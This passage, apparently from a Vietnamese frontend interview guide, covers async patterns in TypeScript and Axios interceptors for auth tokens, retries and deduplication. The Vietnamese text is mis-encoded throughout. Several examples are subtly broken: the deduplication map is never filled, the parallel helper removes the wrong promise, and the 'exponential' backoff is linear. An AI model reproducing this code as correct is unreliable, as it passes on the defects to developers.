// T2: Balance = 400 âŒ (Should be rejected!)

// âœ… GIáº¢I PHÃP 1: Mutex lock
class Mutex {
  private locked = false;
  private waiting: Array<() => void> = [];
  
  async lock(): Promise<void> {
    if (!this.locked) {
      this.locked = true;
      return;
    }
    
    // Wait for unlock
    await new Promise<void>(resolve => {
      this.waiting.push(resolve);
    });
  }
  
  unlock(): void {
    const next = this.waiting.shift();
    if (next) {
      next();
    } else {
      this.locked = false;
    }
  }
}

const balanceMutex = new Mutex();

async function withdrawSafe(amount: number) {
  await balanceMutex.lock();
  
  try {
    await delay(100);
    
    if (balance >= amount) {
      balance -= amount;
      console.log(`Withdrew ${amount}, balance: ${balance}`);
    } else {
      console.log('Insufficient funds');
    }
  } finally {
    balanceMutex.unlock();
  }
}

// âœ… GIáº¢I PHÃP 2: Queue pattern
class WithdrawalQueue {
  private queue: Array<() => Promise<void>> = [];
  private processing = false;
  
  async add(fn: () => Promise<void>) {
    this.queue.push(fn);
    
    if (!this.processing) {
      await this.process();
    }
  }
  
  private async process() {
    this.processing = true;
    
    while (this.queue.length > 0) {
      const fn = this.queue.shift()!;
      await fn();
    }
    
    this.processing = false;
  }
}

const withdrawalQueue = new WithdrawalQueue();

async function withdrawQueued(amount: number) {
  await withdrawalQueue.add(async () => {
    await delay(100);
    
    if (balance >= amount) {
      balance -= amount;
      console.log(`Withdrew ${amount}, balance: ${balance}`);
    } else {
      console.log('Insufficient funds');
    }
  });
}
```

---

#### **3ï¸âƒ£ Timeout & Retry - Xá»­ LÃ½ Timeout & Thá»­ Láº¡i**

**ğŸ”¹ Problem: Requests hang forever**

```typescript
// âŒ Váº¤N Äá»€: Request khÃ´ng cÃ³ timeout
async function fetchData() {
  const response = await fetch('/api/data'); // Hang forever náº¿u server khÃ´ng respond
  return response.json();
}

// âœ… GIáº¢I PHÃP 1: Promise.race vá»›i timeout
async function fetchWithTimeout<T>(
  promise: Promise<T>,
  timeoutMs: number
): Promise<T> {
  const timeoutPromise = new Promise<never>((_, reject) => {
    setTimeout(() => reject(new Error('Timeout')), timeoutMs);
  });
  
  return Promise.race([promise, timeoutPromise]);
}

// Usage
try {
  const data = await fetchWithTimeout(
    fetch('/api/data').then(r => r.json()),
    5000 // 5 seconds timeout
  );
  console.log('Data:', data);
} catch (error) {
  console.error('Request failed or timed out:', error);
}

// âœ… GIáº¢I PHÃP 2: AbortController vá»›i timeout
async function fetchWithAbortTimeout(url: string, timeoutMs: number) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeoutMs);
  
  try {
    const response = await fetch(url, { signal: controller.signal });
    clearTimeout(timeoutId);
    return await response.json();
  } catch (error: any) {
    clearTimeout(timeoutId);
    
    if (error.name === 'AbortError') {
      throw new Error('Request timeout');
    }
    throw error;
  }
}

// âœ… GIáº¢I PHÃP 3: Reusable timeout wrapper
function withTimeout<T>(
  promise: Promise<T>,
  timeoutMs: number,
  errorMessage = 'Operation timeout'
): Promise<T> {
  return new Promise((resolve, reject) => {
    const timeoutId = setTimeout(() => {
      reject(new Error(errorMessage));
    }, timeoutMs);
    
    promise
      .then(result => {
        clearTimeout(timeoutId);
        resolve(result);
      })
      .catch(error => {
        clearTimeout(timeoutId);
        reject(error);
      });
  });
}
```

**ğŸ”¹ Problem: Network failures**

```typescript
// âŒ Váº¤N Äá»€: KhÃ´ng cÃ³ retry logic
async function fetchData() {
  const response = await fetch('/api/data');
  return response.json(); // Fail ngay náº¿u network error
}

// âœ… GIáº¢I PHÃP 1: Retry vá»›i exponential backoff
async function fetchWithRetry<T>(
  fn: () => Promise<T>,
  maxRetries = 3,
  delayMs = 1000
): Promise<T> {
  let lastError: Error;
  
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      return await fn();
    } catch (error) {
      lastError = error as Error;
      
      if (attempt < maxRetries) {
        // Exponential backoff: 1s, 2s, 4s, 8s...
        const delay = delayMs * Math.pow(2, attempt);
        console.log(`Retry ${attempt + 1}/${maxRetries} after ${delay}ms`);
        await new Promise(resolve => setTimeout(resolve, delay));
      }
    }
  }
  
  throw lastError!;
}

// Usage
const data = await fetchWithRetry(
  () => fetch('/api/data').then(r => r.json()),
  3,
  1000
);

// âœ… GIáº¢I PHÃP 2: Retry vá»›i condition check
async function fetchWithConditionalRetry<T>(
  fn: () => Promise<T>,
  shouldRetry: (error: Error) => boolean,
  maxRetries = 3,
  delayMs = 1000
): Promise<T> {
  let lastError: Error;
  
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      return await fn();
    } catch (error) {
      lastError = error as Error;
      
      // Chá»‰ retry náº¿u error cÃ³ thá»ƒ recover (network error, 503, etc.)
      if (attempt < maxRetries && shouldRetry(lastError)) {
        const delay = delayMs * Math.pow(2, attempt);
        console.log(`Retrying after ${delay}ms...`);
        await new Promise(resolve => setTimeout(resolve, delay));
      } else {
        break; // KhÃ´ng retry (4xx errors, etc.)
      }
    }
  }
  
  throw lastError!;
}

// Usage: Chá»‰ retry network errors vÃ  5xx errors
const data = await fetchWithConditionalRetry(
  () => fetch('/api/data').then(r => r.json()),
  (error) => {
    // Retry network errors
    if (error.message.includes('network')) return true;
    
    // Retry 5xx server errors
    if ('status' in error && (error as any).status >= 500) return true;
    
    // Don't retry 4xx client errors
    return false;
  },
  3,
  1000
);

// âœ… GIáº¢I PHÃP 3: Advanced retry vá»›i circuit breaker
class CircuitBreaker {
  private failures = 0;
  private lastFailureTime = 0;
  private state: 'CLOSED' | 'OPEN' | 'HALF_OPEN' = 'CLOSED';
  
  constructor(
    private threshold = 5,
    private timeout = 60000 // 60s
  ) {}
  
  async execute<T>(fn: () => Promise<T>): Promise<T> {
    if (this.state === 'OPEN') {
      // Check if timeout passed
      if (Date.now() - this.lastFailureTime > this.timeout) {
        this.state = 'HALF_OPEN';
      } else {
        throw new Error('Circuit breaker is OPEN');
      }
    }
    
    try {
      const result = await fn();
      
      // Success â†’ reset
      if (this.state === 'HALF_OPEN') {
        this.state = 'CLOSED';
      }
      this.failures = 0;
      
      return result;
    } catch (error) {
      this.failures++;
      this.lastFailureTime = Date.now();
      
      if (this.failures >= this.threshold) {
        this.state = 'OPEN';
        console.error('Circuit breaker opened!');
      }
      
      throw error;
    }
  }
}

const breaker = new CircuitBreaker(5, 60000);

async function fetchWithCircuitBreaker() {
  return breaker.execute(() => fetch('/api/data').then(r => r.json()));
}
```

---

#### **4ï¸âƒ£ Concurrency Control - Kiá»ƒm SoÃ¡t Äá»“ng Thá»i**

**ğŸ”¹ Problem: Too many concurrent requests**

```typescript
// âŒ Váº¤N Äá»€: Process 1000 items concurrently
async function processAllItems(items: any[]) {
  const results = await Promise.all(
    items.map(item => processItem(item)) // 1000 concurrent requests! ğŸ’¥
  );
  return results;
}

// âœ… GIáº¢I PHÃP 1: Batch processing
async function processInBatches<T, R>(
  items: T[],
  batchSize: number,
  processFn: (item: T) => Promise<R>
): Promise<R[]> {
  const results: R[] = [];
  
  for (let i = 0; i < items.length; i += batchSize) {
    const batch = items.slice(i, i + batchSize);
    const batchResults = await Promise.all(batch.map(processFn));
    results.push(...batchResults);
    
    console.log(`Processed ${Math.min(i + batchSize, items.length)}/${items.length}`);
  }
  
  return results;
}

// Usage: Process 100 items per batch
const results = await processInBatches(items, 100, processItem);

// âœ… GIáº¢I PHÃP 2: Concurrency limit vá»›i p-limit pattern
class ConcurrencyLimiter {
  private queue: Array<() => Promise<any>> = [];
  private running = 0;
  
  constructor(private limit: number) {}
  
  async run<T>(fn: () => Promise<T>): Promise<T> {
    while (this.running >= this.limit) {
      await new Promise(resolve => setTimeout(resolve, 10));
    }
    
    this.running++;
    
    try {
      return await fn();
    } finally {
      this.running--;
    }
  }
}

const limiter = new ConcurrencyLimiter(10); // Max 10 concurrent

async function processAllItemsWithLimit(items: any[]) {
  const results = await Promise.all(
    items.map(item => limiter.run(() => processItem(item)))
  );
  return results;
}

// âœ… GIáº¢I PHÃP 3: Queue vá»›i worker pool
class WorkerPool<T, R> {
  private queue: T[] = [];
  private workers: number = 0;
  private results: R[] = [];
  private resolvePromise?: (value: R[]) => void;
  
  constructor(
    private maxWorkers: number,
    private processFn: (item: T) => Promise<R>
  ) {}
  
  async process(items: T[]): Promise<R[]> {
    this.queue = [...items];
    this.results = [];
    
    return new Promise((resolve) => {
      this.resolvePromise = resolve;
      
      // Start workers
      for (let i = 0; i < Math.min(this.maxWorkers, items.length); i++) {
        this.startWorker();
      }
    });
  }
  
  private async startWorker() {
    this.workers++;
    
    while (this.queue.length > 0) {
      const item = this.queue.shift()!;
      
      try {
        const result = await this.processFn(item);
        this.results.push(result);
      } catch (error) {
        console.error('Worker error:', error);
      }
    }
    
    this.workers--;
    
    // All workers done?
    if (this.workers === 0 && this.resolvePromise) {
      this.resolvePromise(this.results);
    }
  }
}

// Usage
const pool = new WorkerPool(5, processItem); // 5 workers
const results = await pool.process(items);
```

---

#### **5ï¸âƒ£ Async Iteration - Xá»­ LÃ½ Dá»¯ Liá»‡u Stream**

**ğŸ”¹ Problem: Process large datasets**

```typescript
// âŒ Váº¤N Äá»€: Load all data vÃ o memory
async function processAllUsers() {
  const users = await fetchAllUsers(); // 1 million users! ğŸ’¥
  
  for (const user of users) {
    await processUser(user);
  }
}

// âœ… GIáº¢I PHÃP 1: Async Generator
async function* fetchUsersPaginated(pageSize = 100) {
  let page = 0;
  
  while (true) {
    const users = await fetch(`/api/users?page=${page}&size=${pageSize}`)
      .then(r => r.json());
    
    if (users.length === 0) break;
    
    yield* users; // Yield each user
    page++;
  }
}

// Usage: Process one user at a time
for await (const user of fetchUsersPaginated()) {
  await processUser(user);
  console.log(`Processed user ${user.id}`);
}

// âœ… GIáº¢I PHÃP 2: Stream processing
async function processUsersStream() {
  const stream = fetchUsersPaginated();
  
  for await (const user of stream) {
    try {
      await processUser(user);
    } catch (error) {
      console.error(`Failed to process user ${user.id}:`, error);
      // Continue vá»›i user tiáº¿p theo
    }
  }
  
  console.log('All users processed');
}

// âœ… GIáº¢I PHÃP 3: Transform stream
async function* transformUsers(
  source: AsyncIterable<User>,
  transformFn: (user: User) => Promise<TransformedUser>
) {
  for await (const user of source) {
    yield await transformFn(user);
  }
}

// Usage: Chain transformations
const userStream = fetchUsersPaginated();
const enrichedStream = transformUsers(userStream, enrichUser);
const validatedStream = transformUsers(enrichedStream, validateUser);

for await (const user of validatedStream) {
  console.log('Processed:', user);
}
```

---

#### **ğŸ¯ Advanced Patterns - Tá»•ng Há»£p**

```typescript
// =====================================
// ASYNC UTILS LIBRARY
// =====================================

class AsyncUtils {
  // 1. Retry vá»›i exponential backoff
  static async retry<T>(
    fn: () => Promise<T>,
    options = { maxRetries: 3, delay: 1000, backoff: 2 }
  ): Promise<T> {
    let lastError: Error;
    
    for (let attempt = 0; attempt <= options.maxRetries; attempt++) {
      try {
        return await fn();
      } catch (error) {
        lastError = error as Error;
        
        if (attempt < options.maxRetries) {
          const delay = options.delay * Math.pow(options.backoff, attempt);
          await new Promise(resolve => setTimeout(resolve, delay));
        }
      }
    }
    
    throw lastError!;
  }
  
  // 2. Timeout wrapper
  static withTimeout<T>(
    promise: Promise<T>,
    timeoutMs: number
  ): Promise<T> {
    return Promise.race([
      promise,
      new Promise<never>((_, reject) => {
        setTimeout(() => reject(new Error('Timeout')), timeoutMs);
      }),
    ]);
  }
  
  // 3. Debounced async function
  static debounce<T extends (...args: any[]) => Promise<any>>(
    fn: T,
    delayMs: number
  ): T {
    let timeoutId: NodeJS.Timeout | null = null;
    
    return ((...args: any[]) => {
      return new Promise((resolve, reject) => {
        if (timeoutId) clearTimeout(timeoutId);
        
        timeoutId = setTimeout(() => {
          fn(...args).then(resolve).catch(reject);
        }, delayMs);
      });
    }) as T;
  }
  
  // 4. Parallel vá»›i concurrency limit
  static async parallel<T, R>(
    items: T[],
    fn: (item: T) => Promise<R>,
    concurrency: number
  ): Promise<R[]> {
    const results: R[] = [];
    const executing: Promise<void>[] = [];
    
    for (const item of items) {
      const promise = fn(item).then(result => {
        results.push(result);
      });
      
      executing.push(promise);
      
      if (executing.length >= concurrency) {
        await Promise.race(executing);
        executing.splice(executing.findIndex(p => p === promise), 1);
      }
    }
    
    await Promise.all(executing);
    return results;
  }
  
  // 5. Sleep utility
  static sleep(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}

// =====================================
// USAGE EXAMPLES
// =====================================

// Retry API call
const data = await AsyncUtils.retry(
  () => fetch('/api/data').then(r => r.json()),
  { maxRetries: 3, delay: 1000, backoff: 2 }
);

// Timeout request
const user = await AsyncUtils.withTimeout(
  fetch('/api/user').then(r => r.json()),
  5000
);

// Debounced search
const debouncedSearch = AsyncUtils.debounce(
  async (term: string) => {
    const results = await fetch(`/api/search?q=${term}`).then(r => r.json());
    displayResults(results);
  },
  300
);

// Process vá»›i concurrency limit
const results = await AsyncUtils.parallel(
  items,
  processItem,
  10 // Max 10 concurrent
);
```

---

#### **ğŸ’¡ Best Practices - Tá»•ng Há»£p**

**âœ… DO:**
1. **Always handle errors**: Try-catch trong async functions
2. **Set timeouts**: Prevent hanging requests
3. **Limit concurrency**: Avoid overwhelming server
4. **Use AbortController**: Cancel unnecessary requests
5. **Implement retry logic**: Handle transient failures
6. **Debounce user input**: Reduce API calls
7. **Stream large data**: Don't load all vÃ o memory
8. **Monitor performance**: Track slow operations

**âŒ DON'T:**
1. **Unhandled rejections**: Always catch errors
2. **Infinite retries**: Set max retry limit
3. **Unlimited concurrency**: Control parallel operations
4. **Ignore race conditions**: Handle out-of-order responses
5. **Block UI**: Break long operations into chunks
6. **Forget cleanup**: Cancel pending operations on unmount

---

**ğŸ¯ Káº¿t Luáº­n:**

Async programming phá»©c táº¡p hÆ¡n sync nhiá»u do:
- **Error handling** khÃ³ hÆ¡n (unhandled rejections)
- **Race conditions** (out-of-order responses)
- **Timeout & retry** logic
- **Concurrency control** (avoid overwhelming)
- **Memory management** (streaming large data)

**ğŸ“Œ Promise Combinators Examples:**

```typescript
// Promise.all - táº¥t cáº£ pháº£i thÃ nh cÃ´ng
const [users, posts, comments] = await Promise.all([
  fetch('/api/users').then(r => r.json()),
  fetch('/api/posts').then(r => r.json()),
  fetch('/api/comments').then(r => r.json())
]);

// Promise.any - 1 thÃ nh cÃ´ng lÃ  Ä‘á»§ (fallback)
const data = await Promise.any([
  fetch('/api/primary'),
  fetch('/api/backup1'),
  fetch('/api/backup2')
]);

// Promise.race - ai nhanh nháº¥t
const result = await Promise.race([
  fetch('/api/data'),
  new Promise((_, reject) => setTimeout(() => reject('Timeout'), 5000))
]);

// Promise.allSettled - Ä‘á»£i táº¥t cáº£ complete
const results = await Promise.allSettled([
  fetch('/api/1'),
  fetch('/api/2'),
  fetch('/api/3')
]);
// results = [{ status: 'fulfilled', value: ... }, { status: 'rejected', reason: ... }]
```

NhÆ°ng vá»›i Ä‘Ãºng patterns vÃ  tools, báº¡n cÃ³ thá»ƒ xá»­ lÃ½ má»i tÃ¬nh huá»‘ng async má»™t cÃ¡ch hiá»‡u quáº£! ğŸš€

---
</details>



<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ”Œ Q20: Axios Interceptors - PhÃ¢n TÃ­ch Chi Tiáº¿t & Tá»‘i Æ¯u HÃ³a</span></summary>


**âš¡ Quick Summary:**
> Interceptors = middleware cho request/response. Transform data, add headers, handle errors

**ğŸ’¡ Ghi Nhá»›:**
- ğŸ“¤ **Request**: Transform request trÆ°á»›c khi gá»­i (add token, headers)
- ğŸ“¥ **Response**: Process response/error trÆ°á»›c khi return
- ğŸ”„ **Chain**: Multiple interceptors cháº¡y theo thá»© tá»± LIFO

**Tráº£ lá»i:**

**ğŸ”¥ Core Concepts:**

- **Interceptors**: Middleware functions Ä‘Æ°á»£c execute trÆ°á»›c/sau má»—i HTTP request/response
- **Request Interceptors**: Transform/modify requests trÆ°á»›c khi gá»­i Ä‘áº¿n server (add headers, auth tokens, logging)
- **Response Interceptors**: Process responses hoáº·c handle errors trÆ°á»›c khi return vá» caller
- **Execution Order**: Request interceptors cháº¡y theo thá»© tá»± LIFO (Last In First Out), Response interceptors cháº¡y theo FIFO (First In First Out)
- **Chain of Responsibility Pattern**: Má»—i interceptor cÃ³ thá»ƒ modify data vÃ  pass sang interceptor tiáº¿p theo

**âœ… Æ¯u Ä‘iá»ƒm:**

- **Centralized Logic**: Authentication, logging, error handling á»Ÿ má»™t nÆ¡i duy nháº¥t
- **Code Reusability**: KhÃ´ng cáº§n láº·p láº¡i logic cho má»—i request
- **Separation of Concerns**: TÃ¡ch logic infrastructure ra khá»i business logic
- **Global Error Handling**: Xá»­ lÃ½ errors thá»‘ng nháº¥t (401, 403, 500, network errors)
- **Request/Response Transformation**: Format data tá»± Ä‘á»™ng (camelCase â†” snake_case)
- **Performance Monitoring**: Track request timing, add metrics
- **Retry Logic**: Tá»± Ä‘á»™ng retry failed requests vá»›i exponential backoff
- **Token Refresh**: Automatically refresh expired tokens trÆ°á»›c khi request

**âš ï¸ NhÆ°á»£c Ä‘iá»ƒm:**

- **Side Effects**: CÃ³ thá»ƒ gÃ¢y unexpected behaviors náº¿u khÃ´ng careful
- **Debugging Complexity**: KhÃ³ debug khi cÃ³ nhiá»u interceptors chained
- **Performance Overhead**: Má»—i interceptor adds processing time
- **Memory Leaks**: Náº¿u khÃ´ng cleanup properly khi component unmount

**ğŸ¯ Use Cases & Hoáº¡t Äá»™ng Tá»‘i Æ¯u:**

**Code Example - Comprehensive Implementation:**

```typescript
import axios, {
  AxiosInstance,
  AxiosRequestConfig,
  AxiosResponse,
  AxiosError,
  InternalAxiosRequestConfig,
} from 'axios';

// ============================================
// 1. BASE CONFIGURATION - Táº¡o axios instance
// ============================================
const apiClient: AxiosInstance = axios.create({
  baseURL: process.env.REACT_APP_API_URL || 'https://api.example.com',
  timeout: 10000, // 10 seconds timeout
  headers: {
    'Content-Type': 'application/json',
  },
});

// ============================================
// 2. REQUEST INTERCEPTOR - Authentication & Logging
// ============================================
/**
 * Vietnamese Explanation:
 * - Request interceptor cháº¡y TRÆ¯á»šC KHI request Ä‘Æ°á»£c gá»­i Ä‘i
 * - Thá»© tá»±: Interceptor Ä‘Æ°á»£c add SAU CÃ™NG sáº½ cháº¡y TRÆ¯á»šC (LIFO)
 * - CÃ³ thá»ƒ modify config: headers, params, data, timeout...
 */
apiClient.interceptors.request.use(
  (config: InternalAxiosRequestConfig) => {
    // ğŸ” Add Authentication Token
    const token = localStorage.getItem('accessToken');
    if (token && config.headers) {
      config.headers.Authorization = `Bearer ${token}`;
    }

    // ğŸ“ Add Request ID for tracking (useful for debugging)
    const requestId = `req_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    if (config.headers) {
      config.headers['X-Request-ID'] = requestId;
    }

    // â±ï¸ Add timestamp for performance monitoring
    (config as any).metadata = { startTime: new Date().getTime() };

    // ğŸ“Š Logging (chá»‰ trong development)
    if (process.env.NODE_ENV === 'development') {
      console.log(`ğŸš€ [${config.method?.toUpperCase()}] ${config.url}`, {
        headers: config.headers,
        params: config.params,
        data: config.data,
      });
    }

    return config;
  },
  (error: AxiosError) => {
    // Handle request error (e.g., network down before request sent)
    console.error('âŒ Request Error:', error.message);
    return Promise.reject(error);
  }
);

// ============================================
// 3. RESPONSE INTERCEPTOR - Success Handling
// ============================================
/**
 * Vietnamese Explanation:
 * - Response interceptor cháº¡y SAU KHI nháº­n response tá»« server
 * - Thá»© tá»±: Interceptor Ä‘Æ°á»£c add TRÆ¯á»šC sáº½ cháº¡y TRÆ¯á»šC (FIFO)
 * - CÃ³ thá»ƒ transform response data trÆ°á»›c khi return vá» caller
 */
apiClient.interceptors.response.use(
  (response: AxiosResponse) => {
    // â±ï¸ Calculate request duration
    const duration = new Date().getTime() - (response.config as any).metadata?.startTime;

    // ğŸ“Š Log response (development only)
    if (process.env.NODE_ENV === 'development') {
      console.log(`âœ… [${response.config.method?.toUpperCase()}] ${response.config.url}`, {
        status: response.status,
        duration: `${duration}ms`,
        data: response.data,
      });
    }

    // ğŸ“ˆ Send performance metrics to monitoring service
    if (duration > 3000) {
      // Alert if request takes > 3 seconds
      console.warn(`âš ï¸ Slow request detected: ${response.config.url} (${duration}ms)`);
      // sendToMonitoringService({ url: response.config.url, duration });
    }

    // ğŸ”„ Transform response data (e.g., snake_case â†’ camelCase)
    // response.data = transformKeys(response.data, 'camelCase');

    return response;
  },
  async (error: AxiosError) => {
    // ============================================
    // ERROR HANDLING - Comprehensive error management
    // ============================================
    const originalRequest = error.config as any;

    // ğŸ“Š Log error details
    console.error('âŒ Response Error:', {
      url: originalRequest?.url,
      method: originalRequest?.method,
      status: error.response?.status,
      message: error.message,
    });

    // ğŸ”„ Case 1: RETRY LOGIC - Auto retry on network errors
    if (!error.response && originalRequest && !originalRequest._retry) {
      originalRequest._retry = true;
      originalRequest._retryCount = (originalRequest._retryCount || 0) + 1;

      if (originalRequest._retryCount <= 3) {
        // Maximum 3 retries
        console.log(`ğŸ”„ Retrying request (${originalRequest._retryCount}/3)...`);
        await new Promise((resolve) => setTimeout(resolve, 1000 * originalRequest._retryCount)); // Exponential backoff
        return apiClient(originalRequest);
      }
    }

    // ğŸ” Case 2: TOKEN REFRESH - 401 Unauthorized
    if (error.response?.status === 401 && originalRequest && !originalRequest._retry) {
      originalRequest._retry = true;

      try {
        // Attempt to refresh token
        const refreshToken = localStorage.getItem('refreshToken');
        const response = await axios.post('/auth/refresh', { refreshToken });

        const { accessToken, refreshToken: newRefreshToken } = response.data;

        // Save new tokens
        localStorage.setItem('accessToken', accessToken);
        localStorage.setItem('refreshToken', newRefreshToken);

        // Retry original request with new token
        if (originalRequest.headers) {
          originalRequest.headers.Authorization = `Bearer ${accessToken}`;
        }

        console.log('ğŸ” Token refreshed successfully, retrying original request...');
        return apiClient(originalRequest);
      } catch (refreshError) {
        // Refresh failed â†’ logout user
        console.error('âŒ Token refresh failed, logging out...');
        localStorage.clear();
        window.location.href = '/login';
        return Promise.reject(refreshError);
      }
    }

    // ğŸš« Case 3: FORBIDDEN - 403 (No permission)
    if (error.response?.status === 403) {
      console.error('ğŸš« Access Forbidden - You do not have permission');
      // Show toast notification or redirect
      // toast.error('You do not have permission to access this resource');
    }

    // âš ï¸ Case 4: NOT FOUND - 404
    if (error.response?.status === 404) {
      console.error('âš ï¸ Resource not found');
      // Handle 404 error (e.g., redirect to 404 page)
    }

    // ğŸ”¥ Case 5: SERVER ERROR - 500+
    if (error.response?.status && error.response.status >= 500) {
      console.error('ğŸ”¥ Server Error - Please try again later');
      // Show user-friendly error message
      // toast.error('Server error occurred. Please try again later.');
    }

    // ğŸŒ Case 6: NETWORK ERROR - No response from server
    if (error.code === 'ECONNABORTED' || error.message.includes('timeout')) {
      console.error('â±ï¸ Request Timeout - Check your connection');
      // toast.error('Request timeout. Please check your internet connection.');
    }

    // Return formatted error
    return Promise.reject({
      message: error.response?.data?.message || error.message,
      status: error.response?.status,
      data: error.response?.data,
    });
  }
);

// ============================================
// 4. ADVANCED: MULTIPLE INTERCEPTORS - Execution Order
// ============================================
/**
 * Vietnamese Explanation vá» thá»© tá»± execution:
 * 
 * Request Interceptors (LIFO - Last In First Out):
 * - Interceptor Ä‘Æ°á»£c add SAU CÃ™NG cháº¡y TRÆ¯á»šC
 * - Example: Add interceptor 1 â†’ Add interceptor 2 â†’ Add interceptor 3
 * - Execution: 3 â†’ 2 â†’ 1 â†’ Request sent
 * 
 * Response Interceptors (FIFO - First In First Out):
 * - Interceptor Ä‘Æ°á»£c add TRÆ¯á»šC cháº¡y TRÆ¯á»šC
 * - Example: Add interceptor 1 â†’ Add interceptor 2 â†’ Add interceptor 3
 * - Execution: Response received â†’ 1 â†’ 2 â†’ 3
 */

// Request Interceptor 1 (will run SECOND)
const reqInterceptor1 = apiClient.interceptors.request.use(
  (config) => {
    console.log('Request Interceptor 1 - Add default headers');
    config.headers['X-Custom-Header'] = 'value1';
    return config;
  }
);

// Request Interceptor 2 (will run FIRST - added last)
const reqInterceptor2 = apiClient.interceptors.request.use(
  (config) => {
    console.log('Request Interceptor 2 - Add timestamp');
    config.headers['X-Timestamp'] = Date.now().toString();
    return config;
  }
);

// Response Interceptor 1 (will run FIRST)
const resInterceptor1 = apiClient.interceptors.response.use(
  (response) => {
    console.log('Response Interceptor 1 - Transform data');
    return response;
  }
);

// Response Interceptor 2 (will run SECOND)
const resInterceptor2 = apiClient.interceptors.response.use(
  (response) => {
    console.log('Response Interceptor 2 - Cache response');
    return response;
  }
);

// ============================================
// 5. CLEANUP - Remove interceptors when needed
// ============================================
/**
 * Vietnamese Explanation:
 * - Quan trá»ng: PHáº¢I remove interceptors khi component unmount
 * - TrÃ¡nh memory leaks vÃ  duplicate interceptors
 * - Use trong useEffect cleanup hoáº·c componentWillUnmount
 */
export const cleanupInterceptors = () => {
  apiClient.interceptors.request.eject(reqInterceptor1);
  apiClient.interceptors.request.eject(reqInterceptor2);
  apiClient.interceptors.response.eject(resInterceptor1);
  apiClient.interceptors.response.eject(resInterceptor2);
};

// ============================================
// 6. ADVANCED USE CASE: Request Queuing & Throttling
// ============================================
/**
 * Vietnamese Explanation:
 * - Giá»›i háº¡n sá»‘ lÆ°á»£ng concurrent requests
 * - Prevent overwhelming server vá»›i too many requests cÃ¹ng lÃºc
 * - Useful cho rate-limited APIs
 */
class RequestQueue {
  private queue: Array<() => Promise<any>> = [];
  private activeRequests = 0;
  private maxConcurrent = 5; // Maximum 5 concurrent requests

  async add<T>(requestFn: () => Promise<T>): Promise<T> {
    // Náº¿u Ä‘Ã£ Ä‘áº¡t max concurrent, Ä‘á»£i trong queue
    if (this.activeRequests >= this.maxConcurrent) {
      await new Promise<void>((resolve) => {
        this.queue.push(() => {
          resolve();
          return Promise.resolve();
        });
      });
    }

    this.activeRequests++;

    try {
      const result = await requestFn();
      return result;
    } finally {
      this.activeRequests--;

      // Process next request in queue
      const nextRequest = this.queue.shift();
      if (nextRequest) {
        nextRequest();
      }
    }
  }
}

const requestQueue = new RequestQueue();

// Add queuing interceptor
apiClient.interceptors.request.use(
  async (config) => {
    await requestQueue.add(() => Promise.resolve());
    return config;
  }
);

// ============================================
// 7. ADVANCED: Request Deduplication
// ============================================
/**
 * Vietnamese Explanation:
 * - NgÄƒn cháº·n duplicate requests (cÃ¹ng URL + method + params)
 * - Náº¿u cÃ³ request Ä‘ang pending, return káº¿t quáº£ cá»§a request Ä‘Ã³
 * - Useful khi user click nhiá»u láº§n hoáº·c component re-render
 */
const pendingRequests = new Map<string, Promise<any>>();

apiClient.interceptors.request.use(
  (config) => {
    // Create unique key for this request
    const requestKey = `${config.method}:${config.url}:${JSON.stringify(config.params)}`;

    // Náº¿u Ä‘Ã£ cÃ³ request pending vá»›i key nÃ y
    if (pendingRequests.has(requestKey)) {
      console.log('ğŸ”„ Duplicate request detected, using pending request...');
      // Return pending promise (sáº½ reject nÃ y Ä‘á»ƒ reuse pending request)
      throw {
        __DUPLICATE__: true,
        promise: pendingRequests.get(requestKey),
      };
    }

    // Store request key in config for later cleanup
    (config as any).__requestKey = requestKey;

    return config;
  },
  (error) => {
    // Náº¿u lÃ  duplicate request, return pending promise
    if (error.__DUPLICATE__) {
      return error.promise;
    }
    return Promise.reject(error);
  }
);

apiClient.interceptors.response.use(
  (response) => {
    // Remove from pending requests
    const requestKey = (response.config as any).__requestKey;
    if (requestKey) {
      pendingRequests.delete(requestKey);
    }
    return response;
  },
  (error) => {
    // Remove from pending requests even on error
    const requestKey = (error.config as any).__requestKey;
    if (requestKey) {
      pendingRequests.delete(requestKey);
    }
    return Promise.reject(error);
  }
);

// ============================================
// 8. USAGE EXAMPLES
// ============================================
export const exampleUsage = async () => {
  try {
    // Táº¥t cáº£ requests sáº½ tá»± Ä‘á»™ng cÃ³:
    // - Auth token header
    // - Request ID
    // - Performance monitoring
    // - Error handling
    // - Auto retry on network errors
    // - Token refresh on 401
    const response = await apiClient.get('/users');
    console.log('Users:', response.data);

    const user = await apiClient.post('/users', {
      name: 'John Doe',
      email: 'john@example.com',
    });
    console.log('Created user:', user.data);
  } catch (error) {
    console.error('Error:', error);
  }
};

// ============================================
// 9. REACT HOOK INTEGRATION
// ============================================
/**
 * Vietnamese Explanation:
 * - Integrate interceptors vá»›i React lifecycle
 * - Cleanup khi component unmount
 */
import { useEffect } from 'react';

export const useAxiosInterceptors = () => {
  useEffect(() => {
    // Setup interceptors
    const requestInterceptor = apiClient.interceptors.request.use(
      (config) => {
        // Add logic here
        return config;
      }
    );

    const responseInterceptor = apiClient.interceptors.response.use(
      (response) => {
        // Add logic here
        return response;
      }
    );

    // Cleanup function
    return () => {
      apiClient.interceptors.request.eject(requestInterceptor);
      apiClient.interceptors.response.eject(responseInterceptor);
    };
  }, []); // Empty dependency array = run once on mount
};
```

**ğŸ¯ Best Practices - Tá»‘i Æ¯u HÃ³a:**

1. **Always Cleanup Interceptors**: Eject interceptors khi component unmount Ä‘á»ƒ trÃ¡nh memory leaks
2. **Use Separate Axios Instances**: Táº¡o riÃªng instance cho tá»«ng API (auth API, data API, analytics API)
3. **Avoid Heavy Computation**: Interceptors should be fast, avoid blocking operations
4. **Proper Error Handling**: Always return Promise.reject() trong error handler
5. **Token Refresh Strategy**: Implement queue cho multiple requests khi token expired
6. **Development vs Production**: Use different logging levels (verbose in dev, minimal in prod)
7. **Request/Response Transformation**: Centralize data transformation logic (camelCase â†” snake_case)
8. **Performance Monitoring**: Track slow requests and send metrics to monitoring service
9. **Request Deduplication**: Prevent duplicate identical requests
10. **Rate Limiting**: Implement request queuing to respect API rate limits
11. **Retry Strategy**: Use exponential backoff for failed requests
12. **Timeout Configuration**: Set appropriate timeouts based on endpoint type

